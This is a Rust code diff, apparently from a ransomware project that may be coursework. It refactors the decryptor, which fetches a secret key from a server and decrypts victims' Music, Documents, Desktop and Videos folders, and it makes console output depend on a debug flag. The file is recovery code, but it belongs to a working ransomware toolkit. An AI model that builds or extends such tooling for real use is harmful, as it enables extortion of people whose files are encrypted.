@@ -1,20 +1,23 @@
-use std::path::PathBuf;
 use std::fs;
 use std::io::{self, Write};
+use std::path::PathBuf;
 
 use anyhow::Result;
 
 // use c_monster_co_2ic80::cryptography::encrypt::decrypt_folder;
 use c_monster_co_2ic80::cryptography::decrypt_parallel::decrypt_folder_parallel;
+use c_monster_co_2ic80::debug_log;
+use c_monster_co_2ic80::cryptography::chunk::{DEBUG_ENABLED};
 use c_monster_co_2ic80::networking::client::get_key;
 
-use sodiumoxide::crypto::box_::{PublicKey};
+use sodiumoxide::crypto::box_::PublicKey;
 
 use windows::{
-    core::PWSTR,
-    Win32::{
-        UI::Shell::{SHGetKnownFolderPath, FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos, KNOWN_FOLDER_FLAG},
+    Win32::UI::Shell::{
+        FOLDERID_Desktop, FOLDERID_Documents, FOLDERID_Music, FOLDERID_Videos, KNOWN_FOLDER_FLAG,
+        SHGetKnownFolderPath,
     },
+    core::PWSTR,
 };
 
 fn desktop_file_path(filename: &str) -> Result<PathBuf> {
@@ -31,6 +34,19 @@ fn desktop_file_path(filename: &str) -> Result<PathBuf> {
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     sodiumoxide::init().unwrap();
 
+    let result = run_decryption().await;
+
+    if DEBUG_ENABLED {
+        println!("\nPress Enter to exit...");
+        io::stdout().flush()?;
+        let mut input = String::new();
+        io::stdin().read_line(&mut input)?;
+    }
+    
+    result
+}
+
+async fn run_decryption() -> Result<(), Box<dyn std::error::Error>> {
     let pk_path = desktop_file_path("public_key.donotdelete")?;
     let pk_bytes = fs::read(pk_path)?;
     let pk = PublicKey::from_slice(&pk_bytes)
@@ -38,7 +54,13 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     let sk = get_key(&pk).await?;
 
-    let paths = [FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos];
+    let paths = [
+        FOLDERID_Music,
+        FOLDERID_Documents,
+        FOLDERID_Desktop,
+        FOLDERID_Videos,
+    ];
+    
     unsafe {
         for path in paths {
             let path_ptr: PWSTR = SHGetKnownFolderPath(&path, KNOWN_FOLDER_FLAG(0), None).unwrap();
@@ -47,16 +69,11 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
             // match decrypt_folder(&path_buf, &pk, &sk) {
             match decrypt_folder_parallel(&path_buf, &pk, &sk) {
-                Ok(_) => println!("✓ Successfully encrypted: {:?}", path_buf),
-                Err(e) => println!("✗ Error encrypting {:?}: {}", path_buf, e),
+                Ok(_) => debug_log!("✓ Successfully encrypted: {:?}", path_buf),
+                Err(e) => debug_log!("✗ Error encrypting {:?}: {}", path_buf, e),
             }
         }
     }
-
-    println!("\nPress Enter to exit...");
-    io::stdout().flush()?;
-    let mut input = String::new();
-    io::stdin().read_line(&mut input)?;
 
     Ok(())
 }
